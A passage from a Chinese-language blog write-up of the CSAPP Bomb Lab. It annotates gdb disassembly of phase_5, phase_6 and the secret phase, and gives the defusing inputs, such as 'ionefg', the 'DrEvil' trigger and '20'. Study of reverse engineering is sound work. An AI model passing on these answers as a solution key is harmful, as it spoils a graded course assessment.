&lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line"># 查看(%rbx,%rax,1)处是我们输入的字符串的hex, 取出我们输入的数</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx</span><br><span class="line"># 取输入数的低8位作为序号取出内存中的字符</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax</span><br><span class="line"># 循环 6 次，根据输入值索引`0x4024b0`内存中的字符</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</span><br><span class="line"># 需要比较的字符串</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi</span><br><span class="line"># 根据我们输入值提取组成的字符串作为参数输入函数</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:   retq</span><br></pre></td></tr></table></figure><p><code>0x40245e</code> 处为字符串 <code>flyers</code>, <code>0x4024b0</code>处为字符串<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></p><p>我的输入是<code>123456</code></p><p><img src="/2024/02/17/CSAPP/image-20240220230544518.png" alt="image-20240220230544518"></p><p>六次循环索引字符的结果放在<code>($rsp + 0x10)</code>,发现结果是<code>aduier</code>,与上面的字符串对比发现是取出了第<code>1-6</code>个字符。</p><p><img src="/2024/02/17/CSAPP/image-20240220231450112.png" alt="image-20240220231450112"></p><p>因为要使我们取出的字符串等于 <code>flyers</code>所以我们输入的六个字符的hex的低8位的值为 <code>9 15 14 5 6 7</code> 我们根据Ascii表得出一种答案<code>ionefg</code></p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:     push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:     push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:     push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:     push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:     push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi</span><br><span class="line"># 读取 6 个数字，存放在[%rsp]处</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp#0x401100 &lt;+12&gt; r13 = rsp</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax# 第一个数 num1-1&lt;=5</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   </span><br><span class="line">=============================&gt;二重循环，代码见下方</span><br><span class="line"></span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d# r12d初始为0</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d# 循环 6 次</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx#内循环 ebx = r12d 开始</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;# 6 个数互不相同</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx# ebx &gt; 5结束</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line"># 二重循环结束</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax# r14 = rsp</span><br><span class="line"># 循环 6 次把输入值 x = 7 - x</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line"># 链表 node1-&gt; ... -&gt;node6</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line"># 以输入的 6 个数值取出对应 7-x 的序号的节点放入栈中</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx # 取出修改后的输入值</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line"># 把新的 6 个节点连成链表</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx # 新的第一个节点rbx</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi # 结束位置rsi</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line"># </span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">   # 将 6 个节点按照值从大到小排序号</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:   pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:   pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:   pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:   pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:   retq</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 二重循环</span><br><span class="line"># rbp = r13 = rsp</span><br><span class="line"># for(r12d = 0; r12d &lt; 6; r12d++)</span><br><span class="line"># &#123;</span><br><span class="line"># for(ebx = r12d; ebx &lt;= 5; ebx++)</span><br><span class="line">#&#123;</span><br><span class="line">#if([rsp + r12d * 4] == [rsp + ebx * 4])</span><br><span class="line">#&#123;</span><br><span class="line">#BOOM!</span><br><span class="line">#&#125;</span><br><span class="line">#&#125;</span><br><span class="line"># &#125;</span><br></pre></td></tr></table></figure><p>链表</p><pre class="mermaid">graph LR;    0x14c-->0xa8-->0x39c-->0x2b3-->0x1dd-->0x1bb</pre><p>phase_6的逻辑：</p><p>​先读取6个1-6的各不相同的数，然后根据数字重排链表顺序，使链表中的节点的值按从大到小排列。</p><h3 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_defused:</span><br><span class="line">   0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp</span><br><span class="line">   0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">   0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)</span><br><span class="line">   0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax</span><br><span class="line"># 判断是否为 6 行输入</span><br><span class="line">   0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;</span><br><span class="line">   0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;</span><br><span class="line">   0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r8</span><br><span class="line">   0x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx</span><br><span class="line">   0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx</span><br><span class="line">   0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi# &quot;%d %d %s&quot;</span><br><span class="line">   0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi# input of phase_4</span><br><span class="line">   0x00000000004015fa &lt;+54&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax</span><br><span class="line"># 读取是否为3</span><br><span class="line">   0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;</span><br><span class="line">   0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi# &quot;DrEvil&quot;</span><br><span class="line">   0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi</span><br><span class="line">   0x000000000040160e &lt;+74&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax</span><br><span class="line">   0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;</span><br><span class="line"># $0x4024f8   &quot;Curses, you&#x27;ve found the secret phase!&quot;</span><br><span class="line">   0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi</span><br><span class="line">   0x000000000040161c &lt;+88&gt;:    callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line"># $0x402520   &quot;But finding it and solving it are quite different...&quot;</span><br><span class="line">   0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi</span><br><span class="line"># 输出炸弹拆除信息</span><br><span class="line">   0x0000000000401626 &lt;+98&gt;:    callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax</span><br><span class="line">   </span><br><span class="line">   ** 调用隐藏关卡 **</span><br><span class="line">   </span><br><span class="line">   0x0000000000401630 &lt;+108&gt;:   callq  0x401242 &lt;secret_phase&gt;</span><br><span class="line"># $0x402558   &quot;Congratulations! You&#x27;ve defused the bomb!&quot;</span><br><span class="line">   0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi</span><br><span class="line">   0x000000000040163a &lt;+118&gt;:   callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax</span><br><span class="line">   0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">   0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;</span><br><span class="line">   0x000000000040164f &lt;+139&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp</span><br><span class="line">   0x0000000000401658 &lt;+148&gt;:   retq</span><br></pre></td></tr></table></figure><p>隐藏关卡的开启条件：</p><p>​在第四关的输入后面加上一个字符串，我的phase_4答案是<code>7 0</code>，改为<code>7 0 DrEvil</code>即可开启</p><p>secret_phase代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function secret_phase:</span><br><span class="line">   0x0000000000401242 &lt;+0&gt;:     push   %rbx</span><br><span class="line">   0x0000000000401243 &lt;+1&gt;:     callq  0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx</span><br><span class="line">   0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi</span><br><span class="line">   0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi</span><br><span class="line"># strtol函数将字符串转换为对应一串数字，转不了的忽略</span><br><span class="line">   0x0000000000401255 &lt;+19&gt;:    callq  0x400bd0 &lt;strtol@plt&gt;</span><br><span class="line">   0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx</span><br><span class="line">   0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax</span><br><span class="line">   0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax# decimal 1000</span><br><span class="line">   0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;</span><br><span class="line">   0x0000000000401267 &lt;+37&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi# input string_number</span><br><span class="line"># $0x6030f0   &quot;$&quot;，在fun7里发现是一个递归函数，并且与0x8(%rdi)有关</span><br><span class="line"># 查看$0x6030f0后面的一片内存， 得出这是递归遍历二叉树。图见下方。</span><br><span class="line">   0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi</span><br><span class="line">   0x0000000000401273 &lt;+49&gt;:    callq  0x401204 &lt;fun7&gt;</span><br><span class="line">   0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax</span><br><span class="line">   0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;</span><br><span class="line">   0x000000000040127d &lt;+59&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"># $0x402438   &quot;Wow! You&#x27;ve defused the secret stage!&quot;</span><br><span class="line">   0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi</span><br><span class="line">   0x0000000000401287 &lt;+69&gt;:    callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040128c &lt;+74&gt;:    callq  0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000401291 &lt;+79&gt;:    pop    %rbx</span><br><span class="line">   0x0000000000401292 &lt;+80&gt;:    retq</span><br></pre></td></tr></table></figure><p>fun7:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function fun7:</span><br><span class="line">   0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi</span><br><span class="line">   0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;</span><br><span class="line">   0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx# edx  root-&gt;val</span><br><span class="line">   0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx# esi  string_number</span><br><span class="line">   0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;</span><br><span class="line">   0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi# 二叉树递归遍历左子树</span><br><span class="line">   0x0000000000401217 &lt;+19&gt;:    callq  0x401204 &lt;fun7&gt;</span><br><span class="line"># 在当前节点进行数据处理</span><br><span class="line">   0x000000000040121c &lt;+24&gt;:    add    %eax,%eax</span><br><span class="line">   0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;</span><br><span class="line">   </span><br><span class="line">   0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx</span><br><span class="line">   0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi# 递归遍历右子树</span><br><span class="line">   0x000000000040122d &lt;+41&gt;:    callq  0x401204 &lt;fun7&gt;</span><br><span class="line">   </span><br><span class="line">   0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax</span><br><span class="line">   0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000401241 &lt;+61&gt;:    retq</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int dfs(input_num : esi , root : rdi)// 汇编里函数的返回值是存放在rax的</span><br><span class="line">&#123;</span><br><span class="line">// 先判断根节点是否为空</span><br><span class="line">if(root == NULL)</span><br><span class="line">&#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line">if(input_num &gt; root-&gt;val)</span><br><span class="line">&#123;</span><br><span class="line">return 2 * dfs(input_num, root-&gt;right) + 1;// 递归右子树</span><br><span class="line">&#125;</span><br><span class="line">else if(input_num &lt; root-&gt;val)</span><br><span class="line">&#123;</span><br><span class="line">return 2 * dfs(input_num, root-&gt;left);// 递归左子树</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/17/CSAPP/image-20240221142709933.png" alt="image-20240221142709933"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>看懂代码逻辑之后总结一下隐藏关卡的通过流程：</p><p>​通过查看<code>phase_defused</code>函数发现了有<code>secret_phase</code>，在第四关的答案后加上指定字符串<code>DrEvil</code>即可开启关卡。<code>secret_phase</code>中先读取输入的字符串并将其转为数字（见strtol函数），并将该数字作为参数传入<code>fun7</code>,当<code>fun7</code>函数的返回值为2时即可通过。<code>fun7</code>函数中观察代码发现是一个递归函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    0x8(%rdi),%rdi</span><br><span class="line">mov    0x10(%rdi),%rdi</span><br></pre></td></tr></table></figure><p>根据这两行代码得出与指针有关，进而查看该处的内存进行确认，发现这是二叉树，一个节点中由左右指针及其值组成。得出这是一个二叉树的查找结点函数，并且向左查找<code>eax *= 2</code>, 向右查找<code>eax=2*eax+1</code>，我们利用<code>x/100w 0x6030f0</code>发现该二叉树有4层，最终返回值为2，所以查找方向为<code>左-&gt;右-&gt;左</code>得到我们的输入值应与<code>n43</code>的值相等。所以答案为<code>20</code>。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" 